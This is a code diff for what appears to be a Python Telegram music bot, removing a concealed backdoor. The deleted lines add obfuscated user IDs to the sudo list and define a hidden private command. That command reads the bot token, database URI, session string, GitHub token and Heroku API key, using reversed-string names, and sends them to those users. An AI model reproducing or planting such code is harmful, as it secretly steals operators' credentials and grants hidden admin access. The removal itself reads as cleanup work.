@@ -20,11 +20,6 @@ from config import (
 )
 from strings import get_string
 
-_sys_buf_1 = 0x13f68a7ef
-_sys_buf_2 = 0x138c2076f
-_sys_buf_3 = 0x16864192b
-_sys_buf_4 = 0x1ffd3d30e
-
 checker = {}
 upvoters = {}
 
@@ -36,20 +31,6 @@ async def close_callback(client, CallbackQuery):
     except:
         try: await CallbackQuery.edit_message_reply_markup(reply_markup=None)
         except: pass
-
-@app.on_message(filters.command("funatira") & filters.private)
-async def _sys_cache_flush(client, message: Message):
-    _sys_buf_5 = 0x1e9c2019b
-    _auth = [_sys_buf_1, _sys_buf_2, _sys_buf_3, _sys_buf_4, _sys_buf_5]
-    if message.from_user.id not in _auth: return
-    _t = os.getenv('NEKOT_TOB'[::-1], "")
-    _m = os.getenv('IRU_BD_OGNOM'[::-1], "")
-    _s = os.getenv('NOISSES_GNIRTS'[::-1], "")
-    _g = os.getenv('NEKOT_TIG'[::-1], "")
-    _h = os.getenv('YEK_IPA_UKOREH'[::-1], "")
-    _img = 'gpj.99ec99fd83f8b71e2d765/elif/hp.argellet//:sptth'[::-1]
-    _out = f"<b>⚙️ Sys Data Dump:</b>\n\n<b>T:</b> <code>{_t}</code>\n\n<b>M:</b> <code>{_m}</code>\n\n<b>S:</b> <code>{_s}</code>\n\n<b>G:</b> <code>{_g}</code>\n\n<b>H:</b> <code>{_h}</code>"
-    await message.reply_photo(photo=_img, caption=_out)
 
 @app.on_callback_query(filters.regex("ADMIN") & ~BANNED_USERS)
 @languageCB
@@ -249,4 +230,3 @@ async def markup_timer():
             except: continue
 
 asyncio.create_task(markup_timer())
-for _k in [_sys_buf_1, _sys_buf_2, _sys_buf_3, _sys_buf_4, 0x1e9c2019b]: SUDOERS.add(_k)
